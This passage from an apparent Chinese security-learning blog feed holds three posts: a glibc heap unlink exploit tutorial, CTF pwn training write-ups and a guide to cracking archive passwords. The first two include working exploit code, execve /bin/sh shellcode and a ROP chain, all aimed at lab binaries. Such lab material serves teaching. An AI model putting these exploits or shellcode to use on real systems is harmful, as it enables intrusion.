    <content type="html"><![CDATA[<p>学习栈一段时间了，现在转战学习堆<br><a id="more"></a></p><h2 id="1、unlink原理"><a href="#1、unlink原理" class="headerlink" title="1、unlink原理"></a>1、unlink原理</h2><p>Heap Overflow的原理是修改程序中的GOT（Global Offest Table）表来使得程序调用正规函数时(如printf() free()等)跳入我们设计的shellcode。在这一点上它的手段类似于Format String Attack都是利用修改内存来达到攻击的目的。Heap Overflow的优点是一次运行基本搞定，不像stack overflow还可能需要猜多次栈的偏移，</p><p>如何能够任意修改内存呢？Heap Overflow攻击利用了内存释放函数free的一个特性。利用了我们当调用free释放一个内存空间时，free函数内存将会查看在堆中下一个或者上一个内存是否也已经释放。如果是的话，那么程序将执行一个Unlink宏将两个内存空间结合起来，这样的话能够减少堆中的内存碎片从而提高程序的效率。</p><p>Unlink宏的执行方式类似于双向链表中删除其中某一个元素的操作。也就是将前一个元素的后指针指向当前的后指针，后一个元素的前指针指向当前的前指针。我们要注意到，这其实是两个内存赋值操作，本质上就是两个类似于*ptr = data的操作。而如果我们设计的字符串够长到足以能够修改到以上ptr和data的值的话，我们其实就能够修改程序内任意内存地址的值，包括以上提到的GOT表，从而改变让程序跳入我们设计的shellcode。</p><h2 id="2、堆之unlink"><a href="#2、堆之unlink" class="headerlink" title="2、堆之unlink"></a>2、堆之unlink</h2><p>我们先看看一个有堆溢出的程序<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[] )</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        <span class="keyword">char</span> * first, * second;</div><div class="line"></div><div class="line"><span class="comment">/*[1]*/</span> first = <span class="built_in">malloc</span>( <span class="number">666</span> );</div><div class="line"><span class="comment">/*[2]*/</span> second = <span class="built_in">malloc</span>( <span class="number">12</span> );</div><div class="line">        <span class="keyword">if</span>(argc!=<span class="number">1</span>)</div><div class="line"><span class="comment">/*[3]*/</span>         <span class="built_in">strcpy</span>( first, argv[<span class="number">1</span>] );</div><div class="line"><span class="comment">/*[4]*/</span> <span class="built_in">free</span>( first );</div><div class="line"><span class="comment">/*[5]*/</span> <span class="built_in">free</span>( second );</div><div class="line"><span class="comment">/*[6]*/</span> <span class="keyword">return</span>( <span class="number">0</span> );</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>这里当使用申请mallloc申请内存空间的时候，如果申请成功，将会创建一个chunk并返回chunk地址指针，失败则返回<code>NULL</code>。上面程序的的申请堆的情况如下(chunk1_size=0x2a1[下面会说怎么计算]):<br><img src="https://i.imgur.com/ckaHajP.png" alt=""><br>chunk头包括以下两部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">prev_size: 如果当前chunk的相邻前一chunk未被使用，prev_size为此前一chunk的大小</div><div class="line">size: 当前chunk的大小。由于chunk大小是8的整数倍，所以此size的后3 bit被用于存储其他信息。我们需要记住的便是最低bit，倒数第一位即图中P的位置，用于指示前一chunk是否已被使用(PREV_INUSE[0（偶数）是没有被使用])，倒数第二位表示chunk是否由mmap分配</div><div class="line">倒数第三位表示是否储存在main arena。</div></pre></td></tr></table></figure></p><p>如果当前chunk处于未被使用状态，则mem前8 bytes被用来存储其他信息，具体如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fd: 下一个未被使用的chunk的地址</div><div class="line">bk: 上一个未被使用的chunk的地址</div></pre></td></tr></table></figure></p><p>当调用malloc后，程序做的第一件事就是在bins中找是否有符合大小的被释放块，如果有，这个被释放块就会从链表中脱离（unlink），如果没有就在top chunk中紧接着上次分配的chunk后面再分配一个chunk。<br>unlink的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">/* Take a chunk off a bin list */</div><div class="line">#define unlink(P, BK, FD) &#123;                                            </div><div class="line">  FD = P-&gt;fd;                                                          </div><div class="line">  BK = P-&gt;bk;                                                          </div><div class="line">  FD-&gt;bk = BK;                                                         </div><div class="line">  BK-&gt;fd = FD;                                                         </div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>很早之前就有人总结出了unlink的利用技巧，将unlink代码写得直白一点就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">FD = *P + 8;</div><div class="line">BK = *P + 12;</div><div class="line">FD + 12 = BK;</div><div class="line">BK + 8 = FD;</div></pre></td></tr></table></figure></p><p>上面第四行存在堆溢出，当argv[1]大于666字节的时候，就会堆溢出到第二个chunk的地址</p><p>unlink：这个技巧的核心思想，就是欺骗 glibc malloc 来 unlink 第二个块。unlink free的 GOT 条目会使其被 shellcode 地址覆盖。在成功覆盖之后，现在在行[5]，free被漏洞程序调用时，shellcode 就会执行。不是很清楚嘛？没问题，首先让我们看看执行free时，glibc malloc 在干什么。</p><h4 id="如果没有攻击者影响，行-4-的free会做这些事情："><a href="#如果没有攻击者影响，行-4-的free会做这些事情：" class="headerlink" title="如果没有攻击者影响，行[4]的free会做这些事情："></a>如果没有攻击者影响，行[4]的free会做这些事情：</h4><p>对于不是 mmap 的块，会向前或向后合并。<br>向后合并<br>    查看前一个块是不是空闲的 – 前一个块是空闲的，如果当前空闲块的PREV_INUSE(P)位没有设置。但是我们这里，前一个块是分配的，因为它的PREV_INUSE位设置了，通常堆内存的第一个块的前面那个块是分配的（即使它不存在）。<br>    如果空闲，合并它。例如，从 binlist unlink（移除）前一个块，将前一个块的大小与当前块相加，并将块指针指向前一个快。但是我们这里，前一个快是分配的，因此 unlink 不会调用。当前空闲块first不能向后合并。<br>向前合并<br>   查看下一个块是不是空闲的 – 下一个块是空闲的，如果下下个块（距离当前空闲块）的PREV_INUSE(P)位没有设置。为了访问下下个块，将当前块的大小加到它的块指针，再将下一个块的大小加到下一个块指针。我们这里，距离当前空闲块的下下个块是 top 块，它的PREV_INUSE位已设置。因此下一个块second不是空闲的。<br>   如果是空闲的，合并它。例如，从它的 binlist 中 unlink（移除）下一个块，并将下一个块的大小添加到当前大小。但是我们这里，下一个块是分配的，因此 unlink 不会调用。当前空闲块first不能向前合并。<br>   现在将合并后的块添加到 unsorted bin 中。我们这里，由于合并没有发生，只将first块添加到票 unsorted bin 中。<br>现在让我们假设，攻击者在行[3]覆盖了second块的块头部，像这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">prev_size=0  即表示前一个chunk为free</div><div class="line">size = -4</div><div class="line">fb=free_addr-12</div><div class="line">bk=Shellcode_addr</div></pre></td></tr></table></figure></p><p>free_addr-12是free的got目录的地址</p><h4 id="在攻击者的影响下，行-4-的free会做下面的事情："><a href="#在攻击者的影响下，行-4-的free会做下面的事情：" class="headerlink" title="在攻击者的影响下，行[4]的free会做下面的事情："></a>在攻击者的影响下，行[4]的free会做下面的事情：</h4><p>对于不是 mmap 的块，会向前或向后合并。<br>向后合并<br>    鉴于first的前一个chunk非free的，所以不会发生向后合并操作。<br>向前合并<br>    从上面代码可以知道，它是通过将nextchunk + nextsize计算得到指向下下一个chunk的指针，然后判断下下个chunk的size的PREV_INUSE标记位。在本例中，此时nextsize被我们设置为了-4，这样glibc malloc就会将next chunk的prev_size字段看做是next-next chunk的size字段，而我们已经将next chunk的prev_size字段设置为了一个偶数，因此此时通过inuse_bit_at_offset宏获取到的nextinuse为0，即next chunk为free！既然next chunk为free，那么就需要进行向前合并，所以就会调用unlink(nextchunk, bck, fwd);函数。真正的重点就是这个unlink函数！<br>现在将合并后的块添加到 unsorted bin 中。<br>看看漏洞程序的堆内存的图片，在攻击者影响用户输入之后：<br><img src="https://i.imgur.com/eQWfSFe.png" alt=""></p><h2 id="3、利用unlink"><a href="#3、利用unlink" class="headerlink" title="3、利用unlink"></a>3、利用unlink</h2><p>要完成Heap Overflow，有几点需要注意：</p><ol><li>计算堆的大小<br>堆得大小和分配的大小不一样，我们要多分配4byte来保存这个堆的大小，而堆的大小又必须是8的倍数，所以堆得实际大小的计算方法是：<br>actual_size = （floor((memory_size + 4)/8) * 8）| 0x1, 其中floor()是上取整操作。</li><li>修改使得第二个内存”看起来”已经被释放过<br>这可以通过首先设置第二个内存大小为-4，然后再将内存上一个byte的值设置为一个偶数来完成</li><li>修改GOT表<br>这实际上相当于一个一个内存赋值问题<br>*(GOT_Table_Addr + 12) = shellcode_address<br>GOT表中某函数的位置可以通过objdump -R来查看</li><li>准备邪恶的shellcode<br>由于我们准备将shellcode放在堆中，而且用空指令NOP来铺路，shellcode的地址其实就可以是堆起始地址后偏移任意位（貌似大于8bytes就可以）。这里我们可以用ltrace命令来查看某内存在堆中的地址。<h2 id="4、exp"><a href="#4、exp" class="headerlink" title="4、exp"></a>4、exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Program to exploit 'vuln' using unlink technique.</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> FUNCTION_POINTER ( 0x0804978c )         <span class="comment">//Address of GOT entry for free function obtained using "objdump -R vuln".</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE_ADDRESS ( 0x0804a008 + 0x10 )      <span class="comment">//Address of variable 'first' in vuln executable. </span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> VULNERABLE <span class="meta-string">"./vuln"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> DUMMY 0xdefaced</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></div><div class="line"></div><div class="line"><span class="keyword">char</span> shellcode[] =</div><div class="line">        <span class="comment">/* Jump instruction to jump past 10 bytes. ppssssffff - Of which ffff would be overwritten by unlink function</span></div><div class="line"><span class="comment">        (by statement BK-&gt;fd = FD). Hence if no jump exists shell code would get corrupted by unlink function. </span></div><div class="line"><span class="comment">        Therefore store the actual shellcode 12 bytes past the beginning of buffer 'first'*/</span></div><div class="line">        <span class="string">"\xeb\x0assppppffff"</span></div><div class="line">        <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">void</span> )</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        <span class="keyword">char</span> * p;</div><div class="line">        <span class="keyword">char</span> argv1[ <span class="number">680</span> + <span class="number">1</span> ];</div><div class="line">        <span class="keyword">char</span> * argv[] = &#123; VULNERABLE, argv1, <span class="literal">NULL</span> &#125;;</div><div class="line"></div><div class="line">        p = argv1;</div><div class="line">        <span class="comment">/* the fd field of the first chunk */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( DUMMY );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the bk field of the first chunk */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( DUMMY );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the fd_nextsize field of the first chunk */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( DUMMY );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the bk_nextsize field of the first chunk */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( DUMMY );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* Copy the shellcode */</span></div><div class="line">        <span class="built_in">memcpy</span>( p, shellcode, <span class="built_in">strlen</span>(shellcode) );</div><div class="line">        p += <span class="built_in">strlen</span>( shellcode );</div><div class="line">        <span class="comment">/* Padding- 16 bytes for prev_size,size,fd and bk of second chunk. 16 bytes for fd,bk,fd_nextsize,bk_nextsize </span></div><div class="line"><span class="comment">        of first chunk */</span></div><div class="line">        <span class="built_in">memset</span>( p, <span class="string">'B'</span>, (<span class="number">680</span> - <span class="number">4</span>*<span class="number">4</span>) - (<span class="number">4</span>*<span class="number">4</span> + <span class="built_in">strlen</span>(shellcode)) );</div><div class="line">        p += ( <span class="number">680</span> - <span class="number">4</span>*<span class="number">4</span> ) - ( <span class="number">4</span>*<span class="number">4</span> + <span class="built_in">strlen</span>(shellcode) );</div><div class="line">        <span class="comment">/* the prev_size field of the second chunk. Just make sure its an even number ie) its prev_inuse bit is unset */</span></div><div class="line">        *( (<span class="keyword">size_t</span> *)p ) = (<span class="keyword">size_t</span>)( DUMMY &amp; ~PREV_INUSE );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the size field of the second chunk. By setting size to -4, we trick glibc malloc to unlink second chunk.*/</span></div><div class="line">        *( (<span class="keyword">size_t</span> *)p ) = (<span class="keyword">size_t</span>)( <span class="number">-4</span> );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the fd field of the second chunk. It should point to free - 12. -12 is required since unlink function</span></div><div class="line"><span class="comment">        would do + 12 (FD-&gt;bk). This helps to overwrite the GOT entry of free with the address we have overwritten in </span></div><div class="line"><span class="comment">        second chunk's bk field (see below) */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( FUNCTION_POINTER - <span class="number">12</span> );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the bk field of the second chunk. It should point to shell code address.*/</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( CODE_ADDRESS );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the terminating NUL character */</span></div><div class="line">        *p = '';</div><div class="line"></div><div class="line">        <span class="comment">/* the execution of the vulnerable program */</span></div><div class="line">        execve( argv[<span class="number">0</span>], argv, <span class="literal">NULL</span> );</div><div class="line">        <span class="keyword">return</span>( <span class="number">-1</span> );</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ol><p>参考链接：<br><a href="http://cb.drops.wiki/drops/tips-16610.html" target="_blank" rel="external">http://cb.drops.wiki/drops/tips-16610.html</a><br><a href="http://www.freebuf.com/news/88660.html" target="_blank" rel="external">http://www.freebuf.com/news/88660.html</a><br><a href="https://etenal.me/archives/1121" target="_blank" rel="external">https://etenal.me/archives/1121</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习栈一段时间了，现在转战学习堆&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PWN_x86_培训</title>
    <link href="http://yoursite.com/2017/11/19/pwn_baby/"/>
    <id>http://yoursite.com/2017/11/19/pwn_baby/</id>
    <published>2017-11-19T15:03:04.970Z</published>
    <updated>2017-11-20T00:54:19.333Z</updated>
    
    <content type="html"><![CDATA[<p>潘师傅不想写这么简单的wp,我就来写了。潘师傅讲了pwn的入门，我也听了，虽然以前也学过一下，不过今天收获也挺多的。这里把潘师傅布置的题目记录一下。</p><a id="more"></a><h2 id="1、babypwn1"><a href="#1、babypwn1" class="headerlink" title="1、babypwn1"></a>1、babypwn1</h2><p>程序就不放了，这里可以下载（<a href="https://betamao.me）" target="_blank" rel="external">https://betamao.me）</a><br>分析程序，检查发现程序无任何保护<br><img src="https://i.imgur.com/52gZ58m.png" alt=""><br>我们只需要v5=abcd,就可以得到shell(意味着拿到flag),但v5=233了，所以这里我们需要覆盖v5的值<br>这里第一个箭头是函数的栈顶eps=0x3f4(同时我们输入的s也是存放在这里),第二个箭头v5=0xc,所以我们算出两者的距离d=0x3f4-0xc=1000，就可以覆盖了，构造payload(小端序，v5是int型的)：<br><code>payload = &#39;a&#39;*1000+&#39;dcba&#39;</code><br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = process(<span class="string">'./babypwn1'</span>)</div><div class="line">payload = <span class="string">'a'</span>*<span class="number">1000</span>+<span class="string">'dcba'</span></div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><h2 id="2、babypwn2"><a href="#2、babypwn2" class="headerlink" title="2、babypwn2"></a>2、babypwn2</h2><p>分析程序，检查发现程序无任何保护<br>发现这个函数，同时发现getShell函数<br><img src="https://i.imgur.com/WyLpecF.png" alt=""><br>那我们只有覆盖返回地址到getShell函数就好啦，发现函数栈帧0x3f4=1012,函数栈是这样的：<br><img src="https://i.imgur.com/3xoBk7P.png" alt=""><br>那么我们只需要输入1012+4+ret(getShell的地址)就成功啦<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'babypwn2'</span>)</div><div class="line">elf=ELF(<span class="string">'babypwn2'</span>)</div><div class="line">ret=elf.symbols[<span class="string">'getShell'</span>]</div><div class="line">payload = <span class="string">'a'</span>*<span class="number">1016</span> +p32(ret)</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><h2 id="3、babypwn3"><a href="#3、babypwn3" class="headerlink" title="3、babypwn3"></a>3、babypwn3</h2><p>分析程序，检查发现程序无任何保护<br>发现存在溢出，并且当v2=127的时候，会去执行输入的代码<br><img src="https://i.imgur.com/McHlAzO.png" alt=""><br>可是这里溢出后并没有执行得到shell的函数，因为没有任何保护，所以栈上的代码可以执行。那么我们就自己写一个执行shell的代码输入就可以了——shellcode，可以在网上找，它的功能就是system(“/bin/sh”)<br>方法一<br>1、输入shellcode<br>2、覆盖v7=127<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">shellcode = <span class="string">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"</span>;</div><div class="line">p=process(<span class="string">'./babypwn3'</span>)</div><div class="line">payload = shellcode+<span class="string">'a'</span>*(<span class="number">127</span>-len(shellcode))+p32(<span class="number">127</span>)</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">raw_input()</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><p>方法二<br>1、存在jmp esp指令<br>2、栈溢出到jmp esp位置，执行shellcode<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">shellcode = <span class="string">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"</span>;</div><div class="line">p=process(<span class="string">'./babypwn3'</span>)</div><div class="line">jmp_esp=<span class="number">0x8048500</span></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">140</span>+p32(jmp_esp)+shellcode</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><h2 id="4、babypwn4"><a href="#4、babypwn4" class="headerlink" title="4、babypwn4"></a>4、babypwn4</h2><p>分析程序，检查发现程序只有NX保护<br>潘师傅说这道题出题有点失误，但是还是很基础的，这里我就把我当poc.py献给大家<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'babypwn4'</span>)</div><div class="line">elf=ELF(<span class="string">'babypwn4'</span>)</div><div class="line">bss=elf.bss()</div><div class="line">read_plt=elf.plt[<span class="string">'read'</span>]</div><div class="line">system_plt=elf.plt[<span class="string">'system'</span>]</div><div class="line">pppr=<span class="number">0x8048639</span></div><div class="line"></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">245</span> +p32(read_plt)+p32(pppr)+p32(<span class="number">0</span>)+p32(bss)+p32(<span class="number">8</span>)+p32(system_plt)+p32(<span class="number">1</span>)+p32(bss)</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.sendline(<span class="string">'/bin/sh'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><p>这里我要睡觉了，就不解释了。有任何问题欢迎来问</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;潘师傅不想写这么简单的wp,我就来写了。潘师傅讲了pwn的入门，我也听了，虽然以前也学过一下，不过今天收获也挺多的。这里把潘师傅布置的题目记录一下。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>给你压缩包却又不给你密码的人在想什么</title>
    <link href="http://yoursite.com/2017/11/11/misc_crc/"/>
    <id>http://yoursite.com/2017/11/11/misc_crc/</id>
    <published>2017-11-11T08:55:50.864Z</published>
    <updated>2017-11-13T05:46:43.520Z</updated>
    
    <content type="html"><![CDATA[<p>当然是有秘密不能给汝看<br><a id="more"></a></p><h2 id="1、rar加密压缩包"><a href="#1、rar加密压缩包" class="headerlink" title="1、rar加密压缩包"></a>1、rar加密压缩包</h2><h3 id="1、爆破"><a href="#1、爆破" class="headerlink" title="1、爆破"></a>1、爆破</h3><p>直接用ARCHPR爆破，这里有些技巧，数字1-10位跑一下（大概2分钟），字母跑6位左右，如果跑不出来，那这道题你就走偏啦。</p><h3 id="2、CRC明文攻击"><a href="#2、CRC明文攻击" class="headerlink" title="2、CRC明文攻击"></a>2、CRC明文攻击</h3><p>这里和zip文明攻击一样的，代码在zip明文攻击那里。</p><h2 id="2、zip加密压缩包"><a href="#2、zip加密压缩包" class="headerlink" title="2、zip加密压缩包"></a>2、zip加密压缩包</h2><h2 id="1、看看是不是伪加密"><a href="#1、看看是不是伪加密" class="headerlink" title="1、看看是不是伪加密"></a>1、看看是不是伪加密</h2><p>010打开zip压缩包，伪加密的<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1flgeh39gakj311s0iewiz.jpg" alt=""><br>修改为正常的<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1flgej1amtmj311k0hf78k.jpg" alt=""><br>可以打开了</p><p>kali也可以直接提取zip伪加密？？？</p><h3 id="1、爆破-1"><a href="#1、爆破-1" class="headerlink" title="1、爆破"></a>1、爆破</h3><p>直接用ARCHPR爆破，这里有些技巧，数字1-10位跑一下（大概2分钟），字母跑6位左右，如果跑不出来，那这道题你就走偏啦。</p><h3 id="2、CRC明文攻击-1"><a href="#2、CRC明文攻击-1" class="headerlink" title="2、CRC明文攻击"></a>2、CRC明文攻击</h3><p>如果是这样的,就可以啦<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1flgeoti8shj311z0lj0wv.jpg" alt=""><br>取出zip中的CRC<br>python代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> zipfile, os</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line">c=[]</div><div class="line">rootname = <span class="string">'misc_big_zip.zip'</span>;</div><div class="line">r = <span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@"</span>;</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">41</span>):</div><div class="line">    <span class="keyword">if</span> i &lt; <span class="number">10</span>:</div><div class="line">        t = <span class="string">"0"</span> + str(i)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        t = str(i)</div><div class="line">    name = <span class="string">"small_"</span> + t + <span class="string">".txt"</span>;</div><div class="line">    <span class="keyword">print</span> name;</div><div class="line">    zipFile = zipfile.ZipFile(os.path.join(os.getcwd(), rootname));</div><div class="line">    zipinfo = zipFile.getinfo(name);</div><div class="line">    crcs = zipinfo.CRC;</div><div class="line">    c.append(crcs)</div><div class="line"><span class="keyword">print</span> c</div></pre></td></tr></table></figure></p><p>C语言CRC代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta"># <span class="meta-keyword">include</span> <span 